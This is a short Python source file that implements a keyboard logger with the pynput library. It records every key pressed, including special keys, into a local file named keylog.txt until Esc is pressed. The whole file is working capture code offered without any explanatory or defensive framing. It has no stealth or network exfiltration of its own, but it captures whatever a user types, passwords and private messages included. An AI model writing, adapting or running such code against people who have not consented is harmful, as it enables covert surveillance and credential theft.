# Developed by Sworup Kumar Sahu
from pynput.keyboard import Key, Listener

# File to save logged keys
log_file = "keylog.txt"

def on_press(key):
    try:
        # Log the regular keys
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as file:
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            elif key == Key.tab:
                file.write("\t")
            else:
                file.write(f"[{str(key)}]")

def on_release(key):
    # Stop listener (optional)
    if key == Key.esc:
        return False

def main():
    # Start listening to the keyboard
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
